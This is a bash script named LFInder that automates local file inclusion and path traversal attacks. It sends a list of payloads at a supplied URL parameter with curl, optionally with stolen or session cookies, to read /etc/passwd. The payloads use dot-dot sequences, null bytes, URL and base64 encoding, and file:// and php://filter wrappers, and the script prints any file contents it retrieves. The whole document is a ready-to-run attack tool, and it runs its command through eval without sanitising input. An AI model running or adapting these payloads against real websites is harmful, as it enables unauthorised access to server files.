#!/bin/bash

RED='\033[1;31m'
GREEN='\033[1;32m'
NC='\033[0m'
BLUE='\033[1;34m'
found=false;
ARGS=("$@");
INDEX=0;

COOKIES='';
CURLCOMMAND='curl'


for arg in  "$@";
do

	case $arg in

	"-c") COOKIES=${ARGS[(($INDEX+1))]}; CURLCOMMAND+=" -b  '$COOKIES' "; 

	esac

((INDEX++));
done;


echo -e "${BLUE}\r\n\r\n"
echo "        __     ______ ____            __           "
echo "       / /    / ____//  _/____   ____/ /___   _____ "
echo "      / /    / /_    / / / __ \ / __  // _ \ / ___/ "
echo "     / /___ / __/  _/ / / / / // /_/ //  __// /     "
echo "    /_____//_/    /___//_/ /_/ \__,_/ \___//_/      "
echo -e "${NC}"

if [ "$#" -lt 1 ]; then
	echo " Illegal number of arguments"
	echo ""
	echo " Use example: $0 http://url.com/index.php?parameter="
	echo ""
    exit
fi

Payloads=("../../../../../../../../etc/passwd" "../../../../../../../../etc/passwd%00" "../../../../../../../../etc/passwd%2500" "..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd" "%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd")
Payloads+=("Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==" "../\../\../\../\../\etc/\passwd" "..\/..\/..\/..\/..\/etc\/passwd" "./..//./..//./..//./..//./..//./..//etc//passwd");
Payloads+=( "file:///etc/passwd" "php://filter/resource=/etc/passwd" "php://filter/resource=../../../../../../etc/passwd" "php://filter/read=string.rot13/resource=/etc/passwd" "php://filter/convert.base64-encode/resource=/etc/passwd");

echo -e "${BLUE} \r\n\r\nTESTING PAYLOADS ...\r\n\r\n"

for index in ${!Payloads[@]};
do

	fullCommand="$CURLCOMMAND $1${Payloads[$index]} 2>/dev/null"
	echo -e -n  "${BLUE} "; echo "$1${Payloads[$index]}";
	request=$(eval $fullCommand | grep -v "<" | grep ":");
	if [[ $request == *"root"* ]]; then
		echo -n -e "${GREEN} PAYLOAD:\t\""; echo -n "${Payloads[$index]}"; echo -e "\"\t\tSUCCESS!!!!!\t[+]\r\n";

		if [ "$found" = false ]; then

			printf "${BLUE}\r\n\r\n SHOW  RESULTS?? [Y/N]${NC}"
			read response;
			echo -e "${NC}\r\n"

			if [ $response == "y" ] || [ $response == "Y" ]; then
				passwd=$( echo "$request" );
				echo "$passwd";
				echo -e "\r\n\r\n";
			fi;

			printf "${BLUE} KEEP TESTING PAYLOADS?? [Y/N]"
			read keepTrying;
			if [  $keepTrying == "y" ] || [ $keepTrying == "Y" ]; then
				echo "";
			else
				exit;

			fi
		fi
		found=true;
	else

		echo -e -n "${RED} PAYLOAD:\t\""; echo -n "${Payloads[$index]}"; echo -e "\"\t\tFAILED :/  [-]\r\n"; 
	fi
	sleep 1;
done

exit;
